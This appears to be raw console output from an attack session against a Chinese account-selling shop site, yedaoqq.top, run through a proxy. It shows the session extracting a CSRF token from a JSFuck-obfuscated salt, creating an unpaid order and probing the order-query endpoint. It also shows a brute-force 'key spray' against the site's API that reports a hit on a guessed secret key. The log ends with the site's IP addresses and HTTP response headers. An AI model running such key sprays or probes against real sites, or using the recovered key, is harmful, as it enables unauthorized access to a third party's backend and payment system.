TN=20260803112308729 INPUT=yedao112305
PROXY=103.217.191.29:18762
Traceback (most recent call last):
  File "<string>", line 1, in <module>
FileNotFoundError: [Errno 2] No such file or directory: '/tmp/h4.html'
CSRF=
# Netscape HTTP Cookie File
# https://curl.se/docs/http-cookies.html
# This file was generated by libcurl! Edit at your own risk.


=== tools oracle ===
tools [] => {"code":-5,"msg":"确保各项不能为空"}
tools [x] => 
tools [test] => {"code":-4,"msg":"API对接密钥错误，请在后台设置密钥"}
tools [123456] => {"code":-4,"msg":"API对接密钥错误，请在后台设置密钥"}
tools [yedao] => {"code":-4,"msg":"API对接密钥错误，请在后台设置密钥"}
tools [yedaoqq] => {"code":-4,"msg":"API对接密钥错误，请在后台设置密钥"}
tools [椰岛] => {"code":-4,"msg":"API对接密钥错误，请在后台设置密钥"}
tools [admin] => {"code":-4,"msg":"API对接密钥错误，请在后台设置密钥"}
tools [qqyedao] => {"code":-4,"msg":"API对接密钥错误，请在后台设置密钥"}
=== recreate unpaid + query same session ===
csrf True hs_raw False
jsfuck hashsalt expr len 734
HS=3c4b9b250dfa5e00ddff7d5b6201767f CSRF=57358865858fe62e9c77bb01c5d9bbd4e0c90304ed673eb397477a4bcea2e328
PAY={"code":0,"msg":"\u63d0\u4ea4\u8ba2\u5355\u6210\u529f\uff01","trade_no":"20260803112820111","need":null,"gn_usdt":"1","gm_usdt":"1","pay_alipay":"0","pay_wxpay":"0","pay_qqpay":"1","pay_rmb":null,"user_rmb":null,"paymsg":"<hr\/>\u5c0f\u63d0\u793a\uff1a<b style=\"color:red\">\u5982\u679c\u5fae\u4fe1\u51fa\u73b0\u65e0\u6cd5\u4ed8\u6b3e\u65f6\uff0c\u60a8\u53ef\u4ee5\u628a\u5fae\u4fe1\u7684\u94b1\u8f6c\u5230QQ\u91cc\uff0c\u7136\u540e\u4f7f\u7528QQ\u94b1\u5305\u652f\u4ed8\uff01<a href=\".\/?mod=wx\" target=\"_blank\">\u70b9\u51fb\u67e5\u770b\u6559\u7a0b<\/a><\/b>"}
TN=20260803112820111 INPUT=yedao112819
=== query same session ===
Q [qq=20260803112820111&type=1&csrf_token=57358865858fe62e9c77bb01c5d9bbd4e0c90304ed673eb397477a4bcea2e328] HTTP500 
Q [qq=yedao112819&csrf_token=57358865858fe62e9c77bb01c5d9bbd4e0c90304ed673eb397477a4bcea2e328] HTTP500 
Q [qq=20260803112820111&type=1] HTTP500 
=== getshop ===
No trade_no!
=== short tools key spray ===
tools [yedao] => {"code":-4,"msg":"API对接密钥错误，请在后台设置密钥"}
tools [yedaoqq] => {"code":-4,"msg":"API对接密钥错误，请在后台设置密钥"}
tools [yedaoqq1] => {"code":-4,"msg":"API对接密钥错误，请在后台设置密钥"}
tools [qqyedao] => {"code":-4,"msg":"API对接密钥错误，请在后台设置密钥"}
tools [椰岛] => {"code":-4,"msg":"API对接密钥错误，请在后台设置密钥"}
tools [椰岛发号] => {"code":-4,"msg":"API对接密钥错误，请在后台设置密钥"}
tools [发号网] => 
HIT=发号网
spray_done hit=1
=== DNS/IP ===
103.43.11.95    yedaoqq.top
45.158.21.213   yedaoqq.top
HTTP/1.1 200 Connection established

HTTP/1.1 200 OK
Date: Mon, 03 Aug 2026 03:28:46 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Vary: Accept-Encoding
Vary: Accept-Encoding
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: geolocation=(), microphone=(), camera=()
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Set-Cookie: PHPSESSID=ghjvmuqjit34k2hqsgka1uka5b; expires=Thu, 06-Aug-2026 03:28:46 GMT; Max-Age=259200; path=/
